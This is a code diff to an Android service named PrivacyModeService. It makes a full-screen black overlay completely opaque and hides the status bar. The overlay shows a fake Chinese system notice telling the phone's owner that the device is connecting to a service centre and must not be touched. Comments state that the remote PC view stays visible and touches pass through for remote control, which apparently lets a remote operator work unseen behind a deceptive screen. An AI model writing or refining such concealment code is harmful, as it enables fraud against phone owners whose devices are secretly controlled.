@@ -224,7 +224,7 @@ class PrivacyModeService : Service() {
         
         // Create black overlay view with warning text
         privacyView = TextView(this).apply {
-            setBackgroundColor(Color.argb(230, 0, 0, 0)) // ~90% opacity: Compromise between local darkness and remote visibility
+            setBackgroundColor(Color.argb(255, 0, 0, 0)) // 100% opacity: Completely black for local privacy, PC remote view unaffected
             text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
             setTextColor(Color.WHITE)
             textSize = 28f
@@ -246,6 +246,8 @@ class PrivacyModeService : Service() {
             windowType,
             WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or  // Don't steal key focus
                     WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or   // Keep screen on
+                    WindowManager.LayoutParams.FLAG_FULLSCREEN or // Hide status bar (fullscreen mode)
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or // Allow drawing beyond screen boundaries
                     WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or // Cover entire screen including bars
                     WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Allow touches to pass through (Critical for remote control)
             PixelFormat.TRANSLUCENT // Allow transparency
